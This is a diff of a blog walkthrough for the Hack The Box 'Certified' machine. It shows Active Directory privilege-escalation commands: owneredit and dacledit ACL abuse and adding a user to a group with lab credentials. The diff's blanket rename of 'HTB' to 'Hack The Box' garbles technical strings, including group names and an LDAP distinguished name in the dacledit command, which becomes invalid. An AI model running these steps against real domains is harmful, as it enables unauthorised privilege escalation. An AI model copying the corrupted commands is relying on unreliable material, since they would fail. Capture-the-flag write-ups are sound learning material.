@@ -1,9 +1,9 @@
 ---
-title: "Certified Walkthrough(HTB)"
+title: "Certified Walkthrough(Hack The Box)"
 date: 2025-03-15
 draft: false
 description: "A straight forward walkthrough for Certified hack the box machine"
-tags: ["Medium", "Windows", "HTB", "hacking", "Active Directory", "Walkthrough"]
+tags: ["Medium", "Windows", "Hack The Box", "hacking", "Active Directory", "Walkthrough"]
 ---
 ## Reconnaissance  
 - We got multiple ports open, Which is interesting 
@@ -71,9 +71,9 @@ bloodhound-python -c ALL -u judith.mader -p judith09 -d certified.htb -ns 10.10.
 ![Pasted image 20250101195630.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101195630.png?raw=true)
 - While analyzing the data I found Interesting things
 - **These are my findings:**
-- The user `Judith` has WriteOwner permissions over group `MANAGEMENT@CERTIFIED.HTB`
+- The user `Judith` has WriteOwner permissions over group `MANAGEMENT@CERTIFIED.Hack The Box`
 - The group `Management@certified.htb` has Generic all permission over user `management_svc@certified.htb`
-- The user `MANAGEMENT_SVC@CERTIFIED.HTB` has CanPsRemote permission on the Domain controller(This is not quite useful. At the end we will be abusing AD CS instead of this)
+- The user `MANAGEMENT_SVC@CERTIFIED.Hack The Box` has CanPsRemote permission on the Domain controller(This is not quite useful. At the end we will be abusing AD CS instead of this)
 ![Pasted image 20250101202115.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101202115.png?raw=true)
 
 ## Exploitation
@@ -82,7 +82,7 @@ bloodhound-python -c ALL -u judith.mader -p judith09 -d certified.htb -ns 10.10.
 sudo rdate -n certified.htb
 ```
 #### WriteOwner Abuse
-- First we need to be an user of `MANAGEMENT@CERTIFIED.HTB`
+- First we need to be an user of `MANAGEMENT@CERTIFIED.Hack The Box`
 - Using this command, I can change the ownership of the object to the user which I own
 ```bash
 owneredit.py -action write -new-owner 'judith.mader' -target 'Management' 'certified.htb/judith.mader:judith09'
@@ -90,7 +90,7 @@ owneredit.py -action write -new-owner 'judith.mader' -target 'Management' 'certi
 ![Pasted image 20250101212751.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101212751.png?raw=true)
 - To abuse ownership of a group object, I need to grant myself the AddMember privilege. Impacket's dacledit can be used for this purpose
 ```bash
-dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb/judith.mader:judith09'
+dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=Hack The Box' 'certified.htb/judith.mader:judith09'
 ```
 ![Pasted image 20250101212835.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101212835.png?raw=true)
 - Now I can add the user to the group using `net` tool
@@ -98,7 +98,7 @@ dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -ta
 net rpc group addmem "Management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S "DC01.certified.htb"
 ```
 ![Pasted image 20250101213012.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250101213012.png?raw=true)
-- Now that the user `judith` has become member of the group `MANAGEMENT@CERTIFIED.HTB` I can move to the next step
+- Now that the user `judith` has become member of the group `MANAGEMENT@CERTIFIED.Hack The Box` I can move to the next step
 #### GenericWrite Abuse
 
 {{< badge >}}
